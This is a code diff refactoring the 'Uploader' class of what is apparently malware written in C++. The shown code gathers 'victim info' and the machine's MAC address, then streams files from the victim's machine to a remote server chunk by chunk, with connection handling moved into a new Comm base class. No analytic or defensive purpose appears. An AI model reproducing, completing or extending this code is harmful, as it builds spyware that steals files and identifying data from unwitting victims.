@@ -1,25 +1,10 @@
 #include "uploader.h"
 #include "networking.h"
 
-void Uploader::send_header(byte content_type, int content_length)
-{
-	LOG_D("Send header: type = %d, length = %d", content_type, content_length);
-	socket->write(&content_type, 0, sizeof(byte));
-	socket->write((const byte *)&content_length, 0, sizeof(int));
-}
-
-void Uploader::send_content(const byte * buffer, int offset, int length)
-{
-	LOG_D("Send %d content bytes...", length);
-	socket->write(buffer, offset, length);
-}
-
 void Uploader::upload_mac()
 {
 	byte mac[6];
-	sockaddr sock_addr = socket->get_sock_addr();
-	in_addr addr;
-	addr.S_un.S_addr = inet_addr(sock_addr.sa_data);
+	in_addr addr = get_local_address();
 	if (Networking::get_mac_addr(mac, addr) != NULL)
 	{
 		LOG_I("Send MAC address: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
@@ -72,13 +57,8 @@ void Uploader::upload_file_data(FILE * file)
 		// send file data to server
 		send_content(buffer, 0, length);
 		// read response from server
-		length = socket->read(buffer, 0, 1);
-		// check response
-		if (length <= 0 || buffer[0] == 0)
-		{
-			ignored = true;
+		if (receive_flag() < 1)
 			break;
-		}
 	}
 }
 
@@ -115,16 +95,9 @@ void Uploader::upload(const char * file_path)
 }
 
 Uploader::Uploader(const char * server_addr, int server_port)
+	: Comm(server_addr, server_port)
 {
-	LOG_I("Connect to %s:%d", server_addr, server_port);
-	socket = new Socket(server_addr, server_port);
-	LOG_I("Connected");
 	LOG_I("Sending victim info...");
 	upload_victim_info();
 	LOG_I("Sent!");
-}
-
-Uploader::~Uploader()
-{
-	delete socket;
 }
